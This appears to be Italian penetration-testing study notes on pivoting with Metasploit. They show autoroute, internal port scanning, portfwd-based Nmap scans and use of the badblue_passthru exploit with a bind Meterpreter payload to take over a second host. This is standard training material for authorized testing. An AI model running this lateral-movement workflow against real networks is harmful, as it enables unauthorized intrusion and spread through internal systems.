
# Pivoting
Il Pivoting é una tecnica di post exploitation che consiste nel utilizzare un dispositivo compromesso per attaccare altri dispositivi che si trovano all'interno della sua stessa rete. <br>

Meterptreter ci consente di aggiungere delle rotte all'interno della sottorete bersaglio dandoci la possibilitá di effettuare delle scansioni o di lanciare altri exploit sui dispositvi connessi nella stessa rete. <br>
Quindi, dentro una sessione meterpreter possiamo usare: 
```bash
run autoroute -s <IP>/<SUB>
```
> `-s` sta per Subnet che potrebbe essere per esempio 192.158.1.0/24

Dopo aver applicato la rotta alla rete, possiamo mettere in background la sessione meterpreter (`ctrl+z`) per poi rinominare la sessione con
```bash
sessions -n <nome> -i <ID>
```
e da adesso abbiamo il completo accesso sulla rete target tramite quel dispositivo compromesso, infatti possiamo fare delle scansioni su altri dispositivi
```bash
use auxiliary/scanner/portscan/tcp
set RHOST <IP>
set PORTS 1-1000
run
```
> come `RHOST` andremo a mettere l'ip di una seconda macchina all'interno della rete target 

## Port Fowarding
Con  `autoroute` non possiamo usare Nmap per eseguire una scansione perché é applicato solo ai moduli di metasploit. <br>
per poter effettuare una scansione nmap, l'unico modo é quello di utilizzare meterpreter sulla macchina comrpomessa come ponte tra la nostra macchina attaccante e la seconda macchina target.
```bash
# dentro Meterpreter
portfwd add -l 1234 -p 80 -r <IP>
```
>  `-l` é la porta locale della macchina attaccante
>  `-p` é la porta del secondo target su cui vogliamo effettuare la connessione
>  `-r` é l'IP della seconda macchinia target

Dopo aver impostato il port forwarding possiamo effettuare una scansione nmap sulla porta 80 del target (`-p`) tramite la nostra porta locale (`-l`) utilizzando Metasploit:
```bash
db_nmap -sV -sS -p1234 localhost
```
> mi raccomando col effettuare la scansione alla nostra stessa porta al nostro stesso indirizzo IP per poter utilizzare il port farewarding appena impostato

Adesso possiamo utilizzare un modulo metasploit per exploitare un servizio su una determinata porta come ad esempio
```bash
use exploit/windows/http/badblue_passthru
set payload windows/meterpreter/bind_tcp      # impostiamo il collegamento diretto e non reverse dato che abbiamo già connesse le porte con il port forewarding
set RHOST <IP>                                # ip del secondo target
set LPORT <PORT>                              # impostare una porta diversa da quella usata da meterpreter per il primo target e da kali per il port forewarding
run
```
dopo aver usato questo modulo, avremo una sessione meterpreter sul secondo target e potremmo continuare cosí per tutti i dispositivi presenti all'interno della rete target.

---
